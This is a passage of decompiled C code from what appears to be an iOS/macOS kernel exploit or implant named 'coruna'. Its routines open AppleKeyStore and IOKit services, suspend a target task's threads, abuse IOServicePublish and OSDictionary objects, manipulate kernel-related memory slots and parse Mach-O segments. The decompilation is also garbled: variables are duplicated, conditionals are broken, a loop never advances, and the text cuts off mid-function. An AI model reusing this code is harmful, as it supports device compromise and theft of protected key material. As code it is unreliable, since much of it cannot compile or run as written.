      size = size - 1;
    } while (size != 0);
  }
  return err;
}





void coruna_cfpropertylistcreatewithdata(uint *size,unsigned long arg,char *path)
{
  uint u;
  uint8_t *ptr;
  int err;
  size_t ls4;
  void **lppv5;
  long handle;
  void *ptr;
  long addr;
  long off;
  char *ptr;
  uint64_t size;
  uint64_t scratch;
  long bootargs;
  uint *thread_attr;
  uint32_t host_info;
  long serial_buf;
  uint64_t action;
  uint32_t block_ctx;
  pthread_t stack_guard;
  uint8_t sa_saved[24];
  int sa_new [26];
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 100;
  bootargs = 0;
  if (0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) {
    coruna_cfdatagetbyteptr(size,arg,path,1);
    if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
    return;
    }
    ___stack_chk_fail();
  }
  err = coruna_mach_absolute_time_1a9c0(size,0,&k_kernel_slot_2710);
  if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
  return;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_kernel6544_via_return_zero_2b0c0(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            uint size)
{
  long handle;
  uint64_t u;
  uint scratch;
  
  scratch = 0;
  if ((size & 0xb) == 0) {
    u = 0;
  }
  else {
    handle = coruna_ret_stub_3();
    u = 0;
    if ((((handle != 0) && (handle = coruna_return_zero_2b0c0(val,handle), u = 0, handle != 0)) &&
        (u = coruna_nop_stub_6(val,handle,4,&scratch), (int)u != 0)) &&
       (((scratch & size) == 0 &&
        (u = coruna_cfpropertylistcreatewithdata(val,id_2,size_3), (int)u != 0)))) {
      scratch = scratch | size;
      u = coruna_nop_stub_7(val,handle,&scratch,4);
    }
  }
  return u;
}





void coruna_wait_applekeystore(long *handle)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  uint64_t size;
  long off;
  long base;
  uint32_t version;
  long *ptr;
  unsigned long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  int serial_buf;
  
  base = *handle;
  ptr = (long *)handle[2];
  serial_buf = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  err = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(base,(int)handle[1]);
  if ((err != 0) && (handle = coruna_ptr_canonicalize(base,*(uint64_t *)(base + 0x390)), handle != 0)) {
    if (*(int *)(base + 0x140) < 0x1c1b) {
      u = coruna_ioservicegetmatchingservice("AppleM2ScalerCSCDriver");
fail:
      handle = 0;
    }
    else {
      u = coruna_ioservicegetmatchingservice("AppleKeyStore");
      err = coruna_ctx_test_flag(base,4);
      if (err != 0) goto fail;
      handle = *(long *)(base + 0x3a8);
    }
    if (1 < (int)u + 1U) {
      if (handle == 0) {
        err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
joined_r0x0000fc84:
        version = 0;
        if (err == 0) {
          scratch = scratch & 0xffffffff00000000;
          handle = coruna_kernel6544_via_return_zero_2b000(base,serial_buf);
          if ((handle == 0) ||
             (err = _IORegistryEntryGetChildIterator(u,"IOService",&scratch), err != 0))
          goto done;
          while( true ) {
            size = _IOIteratorNext(scratch & 0xffffffff);
            err = (int)size;
            if (err == 0) break;
            addr = coruna_kernel6544_via_return_zero_2b000(base,size);
            if (handle == addr) goto cleanup;
            _IOObjectRelease(size);
          }
          handle = 0;
cleanup:
          _IOObjectRelease(scratch & 0xffffffff);
          version = 0;
          if ((err != 0) && (handle != 0)) {
            handle = handle + 0x20;
            status = coruna_kernel6544_residual_256(base,handle,&host_info);
            if ((status != 0) &&
               (((addr = *(long *)(base + 0x390), *(unsigned long *)(base + 0x158) < 0x1f530000000000 ||
                 ((status = coruna_kernel6544_residual_256(base,*(long *)(base + 0x390) + 0x88,&thread_attr), status != 0
                  && (off = coruna_ptr_canonicalize(base,thread_attr), addr = thread_attr, off != 0)))) &&
                (thread_attr = addr, status = coruna_call_mach_vm_machine_attribute_29df8(base,handle,thread_attr), status != 0)))) {
              status = _IORegistryEntryCreateCFProperties
                                (size,&bootargs,*(uint64_t *)k_kernel_kcfallocatordefault_slot,0)
              ;
              flags = coruna_call_mach_vm_machine_attribute_29df8(base,handle,host_info);
              if ((flags == 0) || (status != 0)) {
                if (bootargs != 0) {
                  _CFRelease();
                }
              }
              else if (bootargs != 0) {
                *ptr = bootargs;
                version = 1;
                goto check_ok;
              }
            }
            version = 0;
          }
check_ok:
          if (1 < err + 1U) {
            _IOObjectRelease(size);
          }
        }
      }
      else {
        err = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x37c),0);
        if (err == 0) {
done:
          version = 0;
        }
        else {
          err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
          status = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x37c),handle);
          version = 0;
          if (status != 0) goto joined_r0x0000fc84;
        }
      }
      if (1 < serial_buf + 1U) {
        scratch = 1;
        _IOServiceClose();
        _IOServiceWaitQuiet(u,&scratch);
      }
      _IOObjectRelease(u);
      *(uint32_t *)(handle + 3) = version;
      return;
    }
  }
  version = 0;
skip:
  *(uint32_t *)(handle + 3) = version;
  return;
}





uint64_t coruna_find_osdictionary(long *handle)
{
  task_t target_task;
  uint8_t *ptr;
  mach_port_t lm2;
  uint u;
  uint size;
  int err;
  uint version;
  long handle;
  uint64_t port;
  long addr;
  long *ptr;
  long off;
  unsigned long tag;
  long base;
  mach_port_name_t name;
  long scratch;
  uint64_t bootargs;
  thread_act_array_t thread_attr;
  uint64_t host_info;
  
  ptr = (long *)*handle;
  base = *ptr;
  target_task = *(task_t *)(ptr + 1);
  off = ptr[2];
  thread_attr = (thread_act_array_t)0x0;
  host_info = 0;
  bootargs = 0;
  lm2 = _mach_host_self();
  u = _host_get_io_master(lm2,(io_master_t *)((long)&host_info + 4));
  ptr = k_kernel_mach_task_self_slot;
  if ((u == 0) &&
     (u = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                  (mach_port_name_t *)&host_info), u == 0)) {
    u = 0xad009;
    off = _IOCFSerialize(off,1);
    if (off != 0) {
      handle = _CFDataGetBytePtr();
      port = _CFDataGetLength(off);
      version = 0xad009;
      if (handle == 0 || (int)port == 0) {
fail:
        u = version;
        name = 0;
      }
      else {
        if (*(long *)(&k_kernel_slot_19a8 + base) == 0) {
          addr = coruna_kernel6544_via_nop_stub_2(base,"iokit.OSDictionary");
          if (addr == 0) {
            version = 0xad011;
            goto fail;
          }
          *(long *)(&k_kernel_slot_19a8 + base) = addr;
        }
        u = 0x2800f;
        err = *(int *)(base + 0x140);
        if ((1 < err - 0x1f53U && err != 0x1c1b) && err != 0x1809) {
          version = 0x28011;
          goto fail;
        }
        lm2 = _mach_thread_self();
        err = coruna_call_mach_timebase_info(lm2);
        if (err == 0) {
          version = 0x28038;
          goto fail;
        }
        lm2 = _mach_thread_self();
        version = coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_4(base,lm2,1,1,0x60);
        if (version != 0) goto fail;
        _thread_switch(0,2,10);
        if (*(task_t *)ptr == target_task) {
          version = _task_threads(target_task,&thread_attr,
                                (mach_msg_type_number_t *)((long)&bootargs + 4));
          if (version != 0) {
done:
            version = version | 0x80000000;
            goto fail;
          }
          if (bootargs != 0) {
            tag = 0;
            do {
              if (1 < thread_attr[tag] + 1) {
                lm2 = _mach_thread_self();
                if (lm2 != thread_attr[tag]) {
                  _thread_suspend(thread_attr[tag]);
                }
              }
              tag = tag + 1;
            } while (tag < bootargs >> 0x20);
          }
        }
        else {
          version = _task_suspend2(target_task,(task_suspension_token_t *)&bootargs);
          if (version != 0) goto done;
        }
        err = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x378),0);
        if (err == 0) {
          port = 0;
cleanup:
          u = 0x1001;
        }
        else {
          version = coruna_kernel6544_via_nop_stub_8(base,*(uint64_t *)(&k_kernel_slot_19a8 + base),0x28,
                               *(uint64_t *)(base + 0x390),coruna_call_ioservicegetmatchingservice_1023c,0);
          if (version == 0) {
            port = coruna_mig_reply_port(host_info,"IOServicePublish",handle,port,host_info & 0xffffffff
                                 ,0,0);
            if ((int)port == 0) goto cleanup;
            scratch = coruna_kernel6544_via_return_zero_2b000(base,port);
            if (scratch == 0) {
              u = 0x2800e;
            }
            else {
              err = coruna_kernel6544_residual_256(base,scratch + 0x10,&scratch);
              if ((err != 0) &&
                 (err = coruna_kernel6544_residual_256(base,scratch + 0x18,&scratch), err != 0)) {
                if (*(long *)(base + 0x390) == scratch) {
                  err = coruna_mach_vm_machine_attribute(base,*(long *)(base + 0x390) +
                                              (long)*(int *)(base + 0x168),0xff);
                  if (err == 0) {
                    u = 0x28010;
                  }
                  else {
                    err = coruna_pthread_attr_setdetachstate(base,*(uint32_t *)(base + 0x378),
                                         *(uint64_t *)(base + 0x3a0));
                    u = 0;
                    if (err == 0) {
                      u = 0x28010;
                    }
                  }
                }
                else {
                  u = 0x2803c;
                }
              }
            }
          }
          else {
            port = 0;
            u = version;
          }
        }
        name = (mach_port_name_t)port;
      }
      _CFRelease(off);
      if ((bootargs != 0) && (thread_attr != (thread_act_array_t)0x0)) {
      tag = 0;
      do {
      if (1 < thread_attr[tag] + 1) {
      lm2 = _mach_thread_self();
      if (lm2 != thread_attr[tag]) {
      _thread_resume(thread_attr[tag]);
      }
      }
      tag = tag + 1;
      } while (tag < bootargs >> 0x20);
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t)thread_attr,
      (bootargs >> 0x20) << 2);
      }
      if (1 < (task_suspension_token_t)bootargs + 1) {
      size = _task_resume2((task_suspension_token_t)bootargs);
      version = size | 0x80000000;
      if (u != 0) {
      version = u;
      }
      if (size != 0) {
      u = version;
      }
      }
      if (1 < host_info + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
      }
      if (1 < name + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
      }
      if (1 < (mach_port_name_t)host_info + 1) {
      _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)host_info,1,
      -1);
      }
      *(uint *)(handle + 1) = u;
      return 0;
    }
  }
  else {
    u = u | 0x80000000;
  }
  name = 0;
check_ok:
  if ((bootargs != 0) && (thread_attr != (thread_act_array_t)0x0)) {
    tag = 0;
    do {
      if (1 < thread_attr[tag] + 1) {
        lm2 = _mach_thread_self();
        if (lm2 != thread_attr[tag]) {
          _thread_resume(thread_attr[tag]);
        }
      }
      tag = tag + 1;
    } while (tag < bootargs >> 0x20);
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t)thread_attr,
                   (bootargs >> 0x20) << 2);
  }
  if (1 < (task_suspension_token_t)bootargs + 1) {
    size = _task_resume2((task_suspension_token_t)bootargs);
    version = size | 0x80000000;
    if (u != 0) {
      version = u;
    }
    if (size != 0) {
      u = version;
    }
  }
  if (1 < host_info + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
  }
  if (1 < name + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
  }
  if (1 < (mach_port_name_t)host_info + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)host_info,1,
                        -1);
  }
  *(uint *)(handle + 1) = u;
  return 0;
}





uint64_t coruna_call_ioservicegetmatchingservice_1023c(void)
{
  coruna_ioservicegetmatchingservice("xyz");
  return 0;
}





uint64_t coruna_call_ioservicegetmatchingservice(void)
{
  coruna_ioservicegetmatchingservice("xyz");
  return 0;
}





void coruna_fn_ptr_cast(void)
{
  return;
}





unsigned long coruna_ptr_canonicalize(uint64_t arg,unsigned long val)

{
  if ((val & 7) != 0 || 0xffffffffeffe < val + 0x1000000000000) {
    val = 0;
  }
  return val;
}





unsigned long coruna_kernel6544_residual_246(long arg,unsigned long val)

{
  unsigned long type_id_13;
  long serial_7;
  unsigned long u;
  long *str;
  
  if (0xffffffffeffe < val + 0x1000000000000) {
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + arg);
    if (*(uint *)(&k_kernel_slot_18a0 + arg) != 0) {
      str = (long *)(&k_kernel_slot_1a18 + arg);
      do {
        type_id_13 = str[-1];
        serial_7 = *str;
        if ((((type_id_13 != 0 && serial_7 != 0) && type_id_13 <= val) && val <= serial_7 + type_id_13) &&
            (((type_id_13 == 0 || serial_7 == 0) || val < type_id_13) || serial_7 + type_id_13 != val)) {
          return val;
        }
        str = str + 3;
        u = u - 1;
      } while (u != 0);
    }
    val = 0;
  }
  return val;
}



coruna_svc_regpack_t coruna_kernel6544_residual_247(long *arg)

{
  long handle;
  unsigned long type_id_14;
  long *copy;
  long base;
  unsigned long version;
  unsigned long *ptr;
  uint8_t version[16];
  
  copy = (long *)*arg;
  handle = arg[1];
  base = *copy + (unsigned long)*(uint *)(copy + 0x19) * 0x38;
  if ((unsigned long)(handle - *(long *)(base + 0x20)) < *(unsigned long *)(base + 0x28)) {
load_ok_15:
    if (*(char *)((long)copy + 0x101) != '\0') {
      copy = (long *)copy[0x15];
    }
    version = handle - copy[0x1e];
    if (((unsigned long)copy[0x16] <= version) &&
       version = type_id_14;
       version = version;
       return version;
  }
  else if (*(uint *)(copy + 1) != 0) {
    version = 0;
    ptr = (unsigned long *)(*copy + 0x28);
    do {
      if (handle - ptr[-1] < *ptr) {
        *(int *)(copy + 0x19) = (int)version;
        if (*(char *)((long)copy + 0x101) != '\0') {
        copy = (long *)copy[0x15];
        }
        version = handle - copy[0x1e];
        if (((unsigned long)copy[0x16] <= version) &&
        version = type_id_14;
        version = version;
        return version;
      }
      version = version + 1;
      ptr = ptr + 7;
    } while (*(uint *)(copy + 1) != version);
  }
  version = 0;
  type_id_14 = 0;
load_ok_16:
  version = type_id_14;
  version = version;
  return version;
}





uint64_t coruna_sizeof_ptr(void)
{
  return 8;
}





kern_return_t coruna_vm_allocate(long handle)
{
  size_t ls1;
  kern_return_t lk2;
  unsigned long u;
  vm_address_t scratch;
  
  if (*(char *)(handle + 0x101) == '\0') {
    if (((*(byte **)(handle + 0x108) == (byte *)0x0) ||
        (scratch = *(vm_address_t *)(handle + 0xb0), scratch == 0)) ||
       (*(vm_size_t *)(handle + 0xb8) == 0)) {
      return 4;
    }
    if ((**(byte **)(handle + 0x108) >> 1 & 1) != 0) {
      lk2 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                           *(vm_size_t *)(handle + 0xb8),0x4000);
      if (lk2 != 0) {
        return lk2;
      }
      u = (unsigned long)*(int *)(handle + 0x38);
      ls1 = 0;
      if (u != 0) {
        ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
      }
      _bzero(*(void **)(handle + 0x108),ls1);
    }
  }
  return 0;
}





uint64_t coruna_kernel6544_via_ioconnect_fd_setup(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint size)
{
  int err;
  uint u;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  
  handle = handle;
  if (*(char *)(handle + 0x101) != '\0') {
    handle = *(long *)(handle + 0xa8);
  }
  kind = *(unsigned long *)(handle + 0xb0);
  if ((arg < kind) || (*(long *)(handle + 0xb8) + kind < arg + arg)) {
    size = 3;
  }
  else {
    size = 0;
    port = (unsigned long)-*(int *)(handle + 0x38);
    tag = port & arg;
    port = ((long)*(int *)(handle + 0x38) + arg + arg) - 1 & port;
    if (tag < port) {
      type_id = (unsigned long)*(int *)(handle + 0x38);
      do {
        version = 0;
        if (type_id != 0) {
          version = (tag - kind) / type_id;
        }
        if (((*(byte *)(*(long *)(handle + 0x108) + version) & 1) == 0) || ((size & 1) != 0)) {
          err = coruna_return_zero_1cf78(*(uint64_t *)(handle + 0x118));
          if (((err != 0) &&
              (((err = coruna_uuid_is_null(*(uint64_t *)(handle + 0x118)), err != 0 &&
                (u = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118)),
                *(uint *)(handle + 0x38) < u)) &&
               (version = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118)),
               port - tag < (version & 0xffffffff))))) && (arg < val)) {
            port = ((long)*(int *)(handle + 0x38) + arg + val) - 1 &
                    (long)-*(int *)(handle + 0x38);
            version = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118));
            if (tag + (version & 0xffffffff) < port) {
              port = coruna_ioconnect_fd_setup(*(uint64_t *)(handle + 0x118));
              port = tag + (port & 0xffffffff);
            }
          }
          err = coruna_nop_stub_6(*(uint64_t *)(handle + 0x118),
                               (*(long *)(handle + 0xe0) - kind) + tag,port - tag,tag);
          if (err != 0) {
            if (tag < port) {
              do {
                version = 0;
                if (type_id != 0) {
                  version = (tag - kind) / type_id;
                }
                *(byte *)(*(long *)(handle + 0x108) + version) =
                     *(byte *)(*(long *)(handle + 0x108) + version) | 1;
                tag = tag + type_id;
              } while (tag < port);
            }
            **(byte **)(handle + 0x108) = **(byte **)(handle + 0x108) | 2;
            return 0;
          }
          return 5;
        }
        tag = tag + type_id;
      } while (tag < port);
      size = 0;
    }
  }
  return size;
}





void coruna_nop_stub(void)
{
  coruna_kernel6544_via_ioconnect_fd_setup();
  return;
}





uint32_t coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup(uint64_t val,uint64_t id_2)
{
  uint32_t u;
  uint32_t *ptr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 4;
  scratch = val;
  scratch = id_2;
  ptr = (uint32_t *)coruna_kernel6544_residual_247(&scratch,1);
  u = 0;
  if (ptr != (uint32_t *)0x0) {
    coruna_kernel6544_via_ioconnect_fd_setup(val,ptr,4,0,0);
    u = *ptr;
  }
  return u;
}





uint64_t coruna_kernel6544_via_kernel6544_via_ioconnect_fd_setup_2(uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 8;
  scratch = val;
  scratch = id_2;
  ptr = (uint64_t *)coruna_kernel6544_residual_247(&scratch,1);
  u = 0;
  if (ptr != (uint64_t *)0x0) {
    coruna_kernel6544_via_ioconnect_fd_setup(val,ptr,8,0,0);
    u = *ptr;
  }
  return u;
}





void coruna_macho_find_loadcmd(long *handle,long addr_2,char *path)
{
  int *err;
  int *status;
  int err;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  while( true ) {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if ((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0))
    break;
  }
  *handle = addr_2;
  handle = *(long *)(err + 6);
  handle[2] = *(long *)(err + 8);
  handle[1] = handle;
  return;
}





void coruna_macho_map_segsect(long *handle,long addr_2,char *path,char *str_2)
{
  int *err;
  int *status;
  int err;
  int *flags;
  unsigned long u;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  do {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if (((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0)) &&
       (u = (unsigned long)(uint)err[0x10], err[0x10] != 0)) {
      flags = err + 0x12;
      do {
        err = _strncmp((char *)flags,str_2,0x10);
        if (err == 0) {
          *handle = addr_2;
          handle = *(long *)(flags + 8);
          handle[2] = *(long *)(flags + 10);
          handle[1] = handle;
          return;
        }
        flags = flags + 0x14;
        u = u - 1;
      } while (u != 0);
    }
    err = (int *)((long)err + (unsigned long)(uint)err[1]);
  } while( true );
}





void coruna_macho_text_sect(long handle)
{
  coruna_macho_map_segsect(handle,*(uint64_t *)(handle + 0x110),"__text");
  return;
}





uint64_t coruna_return_zero_11fd4(long handle,char *path,unsigned long arg)
{
  int *err;
  int *status;
  size_t ls3;
  uint u;
  int err;
  uint size;
  
  err = (int *)(**(long **)(handle + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(handle + 0xd0) + 0x14));
  do {
    if (status <= err) {
      return 0;
    }
    if (*err == -0x7fffffcb) {
      u = err[6];
      size = err[1];
      if (0x1f < u && u < size) {
        ls3 = arg;
        if (size - u <= arg) {
          ls3 = (unsigned long)(size - u);
        }
        err = _strncmp((char *)((long)err + (unsigned long)u),path,ls3);
        if (err == 0) {
          return *(uint64_t *)(err + 2);
        }
      }
    }
    else {
      size = err[1];
    }
    err = (int *)((long)err + (unsigned long)size);
  } while( true );
}





void coruna_ctx_clear_1090c(uint64_t *val,uint64_t id_2)
{
  val[0x21] = 0;
  val[0x20] = 0;
  val[0x23] = 0;
  val[0x22] = 0;
  val[0x1d] = 0;
  val[0x1c] = 0;
  val[0x1f] = 0;
  val[0x1e] = 0;
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[0x23] = id_2;
  val[0x24] = 0;
  return;
}





uint64_t coruna_vm_deallocate_120b8(long handle)
{
  kern_return_t lk1;
  uint64_t u;
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xb0);
  if (((address == 0) || (*(vm_size_t *)(handle + 0xb8) == 0)) ||
     (lk1 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,
                             *(vm_size_t *)(handle + 0xb8)), lk1 != 0)) {
    u = 0;
  }
  else {
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
    u = 1;
  }
  return u;
}





bool coruna_vm_deallocate_1210c(long handle)
{
  size_t ls1;
  uint8_t *ptr;
  bool err;
  kern_return_t lk4;
  void *ptr;
  unsigned long u;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk4 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                  *(vm_size_t *)(handle + 0xe8),(long)*(int *)(handle + 0x38) - 1,1,0,0,0,3,1,
                  in_stack_ffffffffffffffd0);
  err = false;
  if (lk4 == 0) {
    if ((*(vm_address_t *)(handle + 0xb0) != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
      _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xb0),
                     *(vm_size_t *)(handle + 0xb8));
    }
    *(vm_address_t *)(handle + 0xb0) = scratch;
    *(long *)(handle + 0xb8) = *(long *)(handle + 0xe8);
    *(vm_address_t *)(handle + 0xf0) = *(long *)(handle + 0xe0) - scratch;
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    ptr = _calloc(ls1,1);
    *(void **)(handle + 0x108) = ptr;
    err = ptr != (void *)0x0;
  }
  return err;
}





uint64_t coruna_macho_text_seg(long handle,long addr_2)
{
  size_t ls1;
  int err;
  void *ptr;
  uint64_t u;
  int *err;
  uint8_t size;
  unsigned long version;
  long *buf;
  int *status;
  long handle;
  int *flags;
  uint8_t scratch[20];
  uint bootargs;
  
  ptr = _calloc(0x48,1);
  *(void **)(handle + 0xd0) = ptr;
  if (ptr == (void *)0x0) {
    return 0;
  }
  u = coruna_nop_stub_6(*(uint64_t *)(handle + 0x118),addr_2,0x20,scratch);
  if ((int)u == 0) {
    return u;
  }
  ls1 = (unsigned long)bootargs + 0x20;
  err = _calloc(ls1,1);
  if (err == (int *)0x0) {
    return 0;
  }
  u = coruna_nop_stub_6(*(uint64_t *)(handle + 0x118),addr_2,ls1,err);
  if ((int)u == 0) {
    return u;
  }
  **(uint64_t **)(handle + 0xd0) = err;
  if (*err == -0x1120532) {
    size = 4;
  }
  else {
    if (*err != -0x1120531) {
      return 0;
    }
    size = 8;
  }
  *(uint8_t *)(handle + 0x34) = size;
  if (ls1 < err[5] + 0x20) {
    return 0;
  }
  status = err + 8;
  err = (int *)((long)status + (unsigned long)(uint)err[5]);
  if (err <= status) {
    return 1;
  }
  handle = 0;
  flags = status;
  do {
    if ((*flags == 0x19) && (err = _strcmp((char *)(flags + 2),"__TEXT"), err == 0)) {
      handle = addr_2 - *(long *)(flags + 6);
    }
    flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
  } while (flags < err);
  if (handle == 0) {
    return 1;
  }
  if (err <= status) {
    return 1;
  }
  do {
    if (*status == 0x19) {
      version = (unsigned long)(uint)status[0x10];
      if (status[0x10] != 0) {
        buf = (long *)(status + 0x1a);
        do {
          *buf = *buf + handle;
          version = version - 1;
          buf = buf + 10;
        } while (version != 0);
      }
      *(long *)(status + 6) = *(long *)(status + 6) + handle;
    }
    status = (int *)((long)status + (unsigned long)(uint)status[1]);
  } while (status < err);
  return 1;
}





bool coruna_call_find_text_exec(void)
{
  int err;
  
  err = coruna_find_kld_segment();
  return err != 0;
}





unsigned long coruna_find_kld_segment(long *arg,uint32_t val,unsigned long n,uint64_t m)

{
  uint8_t (*lpau1) [16];
  int *err;
  int *status;
  uint size;
  bool status;
  int i;
  unsigned long port;
  long *data;
  uint type_id_17;
  unsigned long type_id_18;
  unsigned long kind;
  int *flags;
  uint type_id_19;
  uint type_id_16;
  long serial_8;
  unsigned long type_id_20;
  unsigned long type_id_8;
  long serial_9;
  uint8_t port[16];
  uint8_t cache_32[16];
  long cache_21;
  
  port = coruna_macho_text_seg(arg,n);
  if ((int)port == 0) {
    return port;
  }
  *(uint32_t *)(arg + 0x1b) = val;
  *(uint8_t *)(arg + 0x20) = 1;
  serial_8 = *(long *)arg[0x1a];
  flags = (int *)(serial_8 + 0x20);
  type_id_16 = *(uint *)(serial_8 + 0x14);
  status = (int *)((long)flags + (unsigned long)type_id_16);
  if ((flags < status && (int *)(serial_8 + 0x28U) <= status) && flags <= status + -2) {
    type_id_17 = 0;
    while( true ) {
      size = flags[1];
      if ((size < 8) || ((unsigned long)((long)status - (long)flags) < (unsigned long)size)) break;
      i = *flags;
      type_id_19 = 0x18;
      if (i < 0xb) {
        if (i != -0x7fffffe1) {
          type_id_19 = 0x30;
          }
          else {
          flags = (int *)((long)flags + (unsigned long)size);
          if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
          flags = (int *)((long)flags + (unsigned long)size);
          if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
        }
load_ok_19:
        if (size < type_id_19) break;
      }
      else {
        if (0x18 < i) {
          if (i == 0x22) {
load_ok_17:
            type_id_19 = 0x30;
          }
          else {
            flags = (int *)((long)flags + (unsigned long)size);
            if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
            type_id_17 = type_id_17 + 1;
            type_id_19 = 0x48;
          }
          if (size < type_id_19) break;
        }
        if (i == 0xb) {
          type_id_19 = 0x50;
          if (size < type_id_19) break;
        }
        if (size < type_id_19) break;
      }
load_ok_18:
      flags = (int *)((long)flags + (unsigned long)size);
      if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
    }
    if (type_id_17 != 0) {
      *(uint *)(arg + 1) = type_id_17;
      data = _malloc((unsigned long)type_id_17 * 0x38);
      *arg = (long)data;
      if (data == (long *)0x0) {
        return 0;
      }
      arg[0x22] = (long)"__TEXT";
      flags = (int *)(serial_8 + 0x20);
      status = (int *)((long)flags + (unsigned long)type_id_16);
      if (flags < status) {
        do {
          if (*flags == 0x19) {
            if (((unsigned long)(uint)flags[1] - 0x48) / 0x50 < (unsigned long)(uint)flags[0x10]) {
              return 0;
            }
            i = _strcmp((char *)(flags + 2),"__TEXT_EXEC");
            if (i == 0) {
              arg[0x22] = (long)"__TEXT_EXEC";
            }
            serial_9 = *(long *)(flags + 0xc);
            serial_8 = *(long *)(flags + 10);
            *data = (long)arg;
            data[2] = serial_9;
            data[1] = serial_8;
            serial_9 = *(long *)(flags + 8);
            serial_8 = *(long *)(flags + 6);
            data[3] = (long)arg;
            data[5] = serial_9;
            data[4] = serial_8;
            data[6] = (long)flags;
            data = data + 7;
          }
          flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
        } while (flags < status);
        serial_8 = *(long *)arg[0x1a];
      }
      serial_9 = NEON_rev64(*(uint64_t *)(serial_8 + 4),4);
      arg[5] = serial_9;
      *(uint32_t *)(arg + 6) = *(uint32_t *)(serial_8 + 0x18);
      type_id_16 = (uint)m;
      if ((type_id_16 >> 8 & 1) != 0) {
        coruna_macho_map_segsect(cache_32,arg,"__TEXT","__thread_starts");
        if (cache_21 != 0) {
          *(uint8_t *)((long)arg + 0x9c) = 1;
        }
        if ((((type_id_16 >> 10 & 1) != 0) && (*arg != 0)) &&
           (serial_8 = *(long *)(*arg + 8), serial_8 != 0)) {
